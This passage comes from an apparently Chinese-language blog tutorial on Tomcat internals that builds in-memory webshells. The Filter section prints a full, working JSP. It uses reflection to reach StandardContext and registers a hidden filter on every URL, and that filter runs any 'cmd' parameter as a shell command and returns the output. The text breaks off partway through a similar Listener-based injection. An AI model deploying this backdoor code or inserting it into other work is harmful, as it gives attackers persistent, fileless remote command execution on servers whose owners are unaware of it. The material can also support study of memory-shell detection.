class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 随便定义一个servlet的名字</span></span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;randomName&quot;</span>;</span><br><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">wrapper.setName(name);</span><br><span class="line"><span class="comment">// 设置服务器一启动就调用这个Servlet的init方法，这里其实也没什么用</span></span><br><span class="line">wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">wrapper.setServlet(servlet);</span><br><span class="line">wrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">standardContext.addChild(wrapper);</span><br><span class="line"><span class="comment">// 添加路由，这里第一个参数是我们定义的servlet匹配的URL路径</span></span><br><span class="line">standardContext.addServletMappingDecoded(<span class="string">&quot;/path&quot;</span>, name);</span><br></pre></td></tr></table></figure><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><h4 id="Filter接口"><a href="#Filter接口" class="headerlink" title="Filter接口"></a>Filter接口</h4><p><code>Filter</code> 接口的作用主要是为了我们定义一个 <code>Filter</code> 在运行过程中需要进行什么操作。</p><p>核心逻辑在 <code>doFilter</code> 中。</p><p><img src="/imgs/1694398726397.png"></p><p>如下是一个实现 <code>Filter</code> 的示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.controller.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//1.放行前，对request数据进行处理，然后处理后的request数据会被传到后面。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo start&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        <span class="comment">//2.放行后，对response对象进行处理，这里的response对象是服务器传过来的。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="FilterDef类"><a href="#FilterDef类" class="headerlink" title="FilterDef类"></a>FilterDef类</h4><p><img src="/imgs/1694399161751.png"></p><ul><li>其中 <code>filter</code> 成员变量保存 <code>Filter</code> 类的实例对象。</li><li><code>filterClass</code> 成员变量保存 <code>Filter</code> 类的实例对象的类型（类路径）。</li><li><code>filterName</code> 成员变量保存 <code>Filter</code> 类的实例对象的名称（往往和类路径是一样，但是也可以不一样）。</li></ul><p>并提供了其 <code>getter</code> ，<code>setter</code> 方法，我们创建一个 <code>Filter</code> 的时候就要创建一个 <code>FilterDef</code> 实例对象，并通过其 <code>setter</code> 方法修改其必需的 <code>Filter</code> 信息内容。**<code>FilterDef</code> 是 <code>Filter</code> 的封装** 。</p><p>定义方式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();  </span><br><span class="line"><span class="comment">// 封装filter实例</span></span><br><span class="line">filterDef.setFilter(filter); </span><br><span class="line"><span class="comment">// name可以取任意一个不重复的值</span></span><br><span class="line">filterDef.setFilterName(name);  </span><br><span class="line"><span class="comment">// 设置Filter的位置，以便能够找到Filter的位置（因为有的时候filterDef.filter为null，我们需要通过filterClass来动态的获取filter）</span></span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());  </span><br></pre></td></tr></table></figure><h4 id="FilterMap类"><a href="#FilterMap类" class="headerlink" title="FilterMap类"></a>FilterMap类</h4><p><img src="/imgs/1694401097240.png"></p><ul><li><p><code>filterName</code> ：保存 <code>Filter</code> 的名称，和前面 <code>FilterDef.filterName</code> 保持一致，且不与其他的 <code>Filter</code> 重复即可。</p></li><li><p><code>dispatcherMapping</code> ：用来设置 <code>Filter</code> 被 <code>Servlet</code> 调用的方式，方式包含有 <code>FORWARD</code> ，<code>INCLUDE</code> ，<code>REQUEST</code> ,  <code>ASYNC</code> ,  <code>ERROR</code> 。这里我们要写 <code>Filter</code> 内存马，那肯定我们想每次请求都需要经过 <code>Filter</code> ，因此这里需要设置为 <code>REQUEST</code> 方式，当然这里也支持同时设置为多种方式。</p><blockquote><ul><li><code>REQUEST</code> ：当用户直接访问页面时，容器将会调用过滤器。如果目标资源是通过 <code>RequestDispatcher</code> 的 <code>include()</code> 或<code> forward()</code> 方法访问，则该过滤器就不会被调用。</li><li><code>INCLUDE</code> ：如果目标资源通过 <code>RequestDispatcher</code> 的 <code>include()</code> 方法访问，则该过滤器将被调用。除此之外，该过滤器不会被调用。</li><li><code>FORWARD</code> ：如果目标资源通过 <code>RequestDispatcher</code> 的<code> forward()</code> 方法访问，则该过滤器将被调用，除此之外，该过滤器不会被调用。</li><li><code>ERROR</code> ：如果目标资源通过声明式异常处理机制访问，则该过滤器将被调用。除此之外，过滤器不会被调用。</li><li><code>ASYNC</code> ：<code>ASYNC</code> 很像是 <code>INCLUDE</code> 的升级版，<code>INCLUDE</code> 是 分配任务给另一个 <code>Servlet</code> 执行，而 <code>ASYNC</code> 则可以将任务分配给任意多个普通线程去执行。</li></ul></blockquote></li><li><p><code>urlPatterns</code> ：表示 <code>Filter</code> 匹配的路径，可以填多个。</p></li><li><p><code>matchAllUrlPattern</code> ：在 <code>urlPattern</code> 定义了多个路径时，就可以用 <code>matchAllUrlPattern</code> 来设置 <code>Filter</code> 是匹配全部 <code>URL</code> 才经过，还是匹配了一个 <code>URL</code> 就经过。</p></li></ul><p>根据上面的分析，可以知道 <code>FilterMap</code> 是用来设置 <code>Filter</code> 何时会被经过的。</p><h4 id="ContextFilterMaps类"><a href="#ContextFilterMaps类" class="headerlink" title="ContextFilterMaps类"></a>ContextFilterMaps类</h4><p><img src="/imgs/1694402711288.png"></p><p><code>ContextFilterMaps</code> 是 <code>StandardContext</code> 用来管理全局所有 <code>FilterMaps</code> 的工具内部类。</p><ul><li><code>array</code> ：存放全局的 <code>Filter</code> 。</li><li><code>insertPoint</code> ：用来在定义一个新的 <code>Filter</code> 时，把这个 <code>Filter</code> 插入到 <code>Filter</code> 链的哪个位置。默认为 <code>0</code> ，也就是放在 <code>FilterMap[]</code> 数组 <code>array</code> 的最前面。这里我们不需要管它的顺序，因为内存马只要能够执行就可以了。</li><li><code>lock</code> ：就是为了给这个类的方法来加锁的，防止多线程访问冲突。这里这个也不是很重要。</li></ul><h4 id="ApplicationFilterConfig类"><a href="#ApplicationFilterConfig类" class="headerlink" title="ApplicationFilterConfig类"></a>ApplicationFilterConfig类</h4><p>通过看这个类里面的内容，可以看出 <code>filterConfigs</code> 和 <code>filterDefs</code> 存储的内容很类似，只不过   <code>filterConfigs</code> 存的内容更多一点。<code>filterConfigs</code> 包含了 <code>filterDefs</code> 里的内容，额外多了一些 <code>log</code> ，<code>context</code> ，<code>filter</code> 属性。</p><p><img src="/imgs/Pasted%20image%2020230911165908.png"></p><h4 id="StandardContext中有关Filter的属性作用介绍"><a href="#StandardContext中有关Filter的属性作用介绍" class="headerlink" title="StandardContext中有关Filter的属性作用介绍"></a>StandardContext中有关Filter的属性作用介绍</h4><p>我们可以在 <code>StandardContext</code> 类中看到三个有关 <code>Filter</code> 的属性，下面来介绍一些这些属性的作用。</p><p><img src="/imgs/1694397018999.png"></p><ul><li><p><code>ContextFilterMaps filterMaps</code> 变量：<br>包含所有 <code>filter</code> 的 <code>url</code> 映射关系。</p></li><li><p><code>Map&lt;String, FilterDefs&gt; filterDefs</code> 变量：<br>包含所有 <code>filter</code> 包括实例内部等变量。</p></li><li><p><code>Map&lt;String, ApplicationFilterConfig&gt; filterConfigs</code> 变量：<br>包含所有与过滤器对应的 <code>filterDef</code> 信息及 <code>filter</code> 实例。</p></li></ul><p>为了更清楚的查看这些变量的作用，最直接，最简单的方式就是直接自己注册一个 <code>Filter</code> ，然后动态调试程序中的 <code>StandardContext</code> 的这些变量存放了什么内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.just.controller.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;init...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">//1.放行前，对request数据进行处理，然后处理后的request数据会被传到后面。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo start&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">        <span class="comment">//2.放行后，对response对象进行处理，这里的response对象是服务器传过来的。</span></span><br><span class="line">        System.out.println(<span class="string">&quot;FilterDemo end&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;destroy...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/imgs/1694398394736.png"></p><p><img src="/imgs/1694422949260.png"></p><p><img src="/imgs/1694422993994.png"></p><h4 id="具体如何动态注册Filter代码"><a href="#具体如何动态注册Filter代码" class="headerlink" title="具体如何动态注册Filter代码"></a>具体如何动态注册Filter代码</h4><ol><li>定义我们自己的 <code>Filter</code> 。</li><li>将我们的 <code>Filter</code> 分别封装为 <code>FilterDef</code> 和 <code>FilterMap</code> 。</li><li>将上面封装好的 <code>FilterDef</code> 和 <code>FilterMap</code> 注册到容器的 <code>standardContext</code> 中。</li><li>创建一个 <code>ApplicationFilterConfig</code> 对象，将其加入到 <code>standardContext</code> 的 <code>filterConfigs</code> 属性中。</li></ol><p>有了前面的基础，下面直接给出代码就很容易看懂了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContext类也有一个context的私有属性，其类型为TomcatEmbeddedContext类，而这个类正是StandardContext类的子类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) applicationContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;standardContext = &quot;</span> + standardContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">// --------------------下面开始是关键------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 standardContext 的 config 字段,这个字段是 Map&lt;String, ApplicationFilterConfig&gt; 类型的。</span></span><br><span class="line">    <span class="comment">// filterConfigs的key是filter的名称，value是filter的实例内容</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="string">&quot;justdoit&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(name) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest req, ServletResponse res, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="comment">//这里写上我们后门的主要代码</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (cmd == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> res.getWriter();</span><br><span class="line">                out.println(output);</span><br><span class="line">                out.flush();</span><br><span class="line">                out.close();</span><br><span class="line">                <span class="comment">//别忘记带这个，不然的话其他的过滤器可能无法使用</span></span><br><span class="line">                filterChain.doFilter(req, res);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将我们创建好的Filter封装到FilterDef中</span></span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        filterDef.setFilterName(name);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterDef注册到standardContext的filterDefs中</span></span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        <span class="comment">//拦截的路由规则，/* 表示拦截任意路由</span></span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setFilterName(name);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterMap注册到standardContext.filterMaps中</span></span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 根据前面的filterDef和standardContext创建一个ApplicationFilterConfig对象</span></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将filterConfig注册到standardContext.filterConfigs中</span></span><br><span class="line">        filterConfigs.put(name, filterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;注入成功&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p><code>Servlet</code> 提供了很多种 <code>Listener</code> 。最常用有以下几个：</p><ul><li><code>HttpSessionListener</code> ：<br>监听 <code>HttpSession</code> 的创建和销毁事件；</li><li><code>ServletRequestListener</code> ：<br>监听 <code>ServletRequest</code> 请求的创建和销毁事件；</li><li><code>ServletRequestAttributeListener</code> ：<br>监听 <code>ServletRequest</code> 请求的属性变化事件（即调用<code>ServletRequest.setAttribute()</code> 方法）；</li><li><code>ServletContextListener</code> ：<br>监听 <code>ServeltContext</code> 的创建和销毁事件。</li><li><code>ServletContextAttributeListener</code> ：<br>监听 <code>ServletContext</code> 的属性变化事件（即调用<code>ServletContext.setAttribute()</code> 方法）；</li></ul><p>很容易想到，这里动态注册 <code>Listener</code> 内存马肯定要用的就是 <code>ServletRequestListener</code> 。</p><h4 id="具体如何动态注册Listener代码"><a href="#具体如何动态注册Listener代码" class="headerlink" title="具体如何动态注册Listener代码"></a>具体如何动态注册Listener代码</h4><p>动态注册 <code>Listener</code> 相比 <code>Filter</code> 就简单了很多，只需要自定义好 <code>Listener</code> ，然后就可以直接通过 <code>standardContext#addApplicationEventListener()</code> 方法添加 <code>Listener</code> 了。 </p><p>下面直接给出代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// request是RequestFacade的类对象，servletContext是ApplicationContextFacade的类对象</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ApplicationContextFacade类有一个context的私有属性，其类型为ApplicationContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">servletContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    servletContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 